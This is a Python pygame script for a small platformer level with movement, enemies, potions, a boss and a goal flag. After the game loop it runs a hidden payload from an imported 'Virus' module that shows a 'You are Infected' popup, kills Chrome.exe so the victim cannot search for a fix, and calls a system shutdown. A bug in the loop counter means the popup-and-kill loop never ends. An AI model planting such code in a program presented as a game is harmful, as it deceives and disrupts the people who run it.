import pygame
import random
import Virus
import os
os.chdir('img')
pygame.init()
win = pygame.display.set_mode((1000,500))
pygame.display.set_caption('Level 2')
i = True
Isleft = False
Isright = False
x = 50
dinox = 700
dino = pygame.image.load('DinoStill.png')
MG = 0
PR = True
PO = pygame.image.load('potion.png')
BH = 150
y = 400
IMR = True
DH = 100
LC = 1
PLH = 100
boss = pygame.image.load('Boss.png')
heart = pygame.image.load('heart.png')
Still = pygame.image.load('Still.png')
WR = pygame.image.load('FR1.png')
WL = pygame.image.load('FL1.png')
AL = pygame.image.load('Stabbie2.png')
AR = pygame.image.load('Stabbie1.png')
flag = pygame.image.load('flag.png')
Bx = 700
def Loadhearts(PLH):
    if PLH >= 25:
        win.blit(heart,(50,50))
    if PLH >= 50:
        win.blit(heart,(100,50))
    if PLH >= 75:
        win.blit(heart,(150,50))
    if PLH >= 100:
        win.blit(heart,(200,50))
    if MG >= 1:
        win.blit(PO,(950,50))
    

while i:
    pygame.time.delay(5)
    win.blit(Still,(x,y))
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
                i = False
    keys = pygame.key.get_pressed()
    if keys[pygame.K_RIGHT]:
        x+=5
        win.blit(WR,(x,y))
        Isright = True
        Isleft = False
    if keys[pygame.K_LEFT]:
        x-=5
        win.blit(WL,(x+5,y) )
        Isleft = True
        Isright = False
    if LC == 1 and x ==0:
        x+=5
    if keys[pygame.K_SPACE]:
        print(x,y,LC)
    if keys[pygame.K_a] and Isleft == True:
        win.blit(AL,(x,y))
        pygame.time.delay(10)
    if keys[pygame.K_a] and Isright == True:
        win.blit(AR,(x,y))
        pygame.time.delay(10)
    if LC == 1:
        if x == 1050:
            x-=1000
            LC+=1
        if PR == True:
            win.blit(PO,(500,450))
        if x == 450 and PR ==True:
            PR =False
            MG+=25
        if DH >=1:
            u = 0
            win.blit(dino,(dinox,400))
            for u in range(5):
                k = random.randint(1,100)
            if k == 5:
                dinox +=10
            elif k ==20:
                dinox-=10
            if x+50 - dinox == 0:
                PLH-=25
                x-=50
            if x - dinox == -50:
                x-=75
            if keys[pygame.K_a] and x+75-dinox==0:
                DH-=25
                x-=80
                dinox +=80
            if dinox >=1000:
                x-=5

    if keys[pygame.K_h] and MG >= 1 and PLH <= 100:
        MG-=5
        PLH+=5
    
    if PLH <=1:
        i= False
    if LC == 2:
        if x== -50:
            LC-=1
            x+=1000
        pygame.draw.rect(win,((0,0,0)),(400,400,50,100))
        if IMR == True:
            #draw
            win.blit(PO,(435,300))
        
        if x == 350 and y ==400:
            x-=5
        if keys[pygame.K_SPACE] and x == 345 and y == 400:
            y-=100
            x+=50
            
        if x == 395 and IMR ==True:
            IMR = False
            MG +=50
        if x==350 and y ==300:
            y+=100
            x-=10
        if x ==435 and y==300:
            y+=100
        if x ==440 and y==400:
            x+=5
        if keys[pygame.K_SPACE] and x == 445 and y == 400:
            y-=100
            x-=50
        if x == 1050:
            LC+=1
            x-=900

    if LC ==3:
        if BH >= 0:
            win.blit(boss,(Bx,400))
        if x ==0 :
            x+=5
        t =0
        for t in range(5):
            o = random.randint(1,100)
        if o== 5:
            Bx+=20
        if o ==20:
            Bx-=20
        if x+50 - Bx == 0 and BH >= 0:
            PLH-=25
            x-=50
        if x - Bx == -50 and BH >= 0:
            x-=75
        if keys[pygame.K_a] and x+75-Bx==0 and BH >= 0:
            BH-=50
            x-=50
            Bx +=80
        if Bx == 1000:
            x-=5
        if x == 1050:
            x-=900
            LC+=1
    if LC == 4:
        if x == 0:
             x+=5
        win.blit(flag,(700,400))
        if x ==650:
            i = False
    
    Loadhearts(PLH)
    pygame.display.update()
    win.fill((255,255,255))
pygame.quit()
a = 1

while a <= 10:
  Virus.beep(800)#800 millisces
  Virus.msgbox('You are Infected','Virus','320x200')
  Virus.Kill('Chrome.exe')#To keep People From googling how to get rid of it
  i+=1
Virus.syskill('s')#Shutdown PC
    
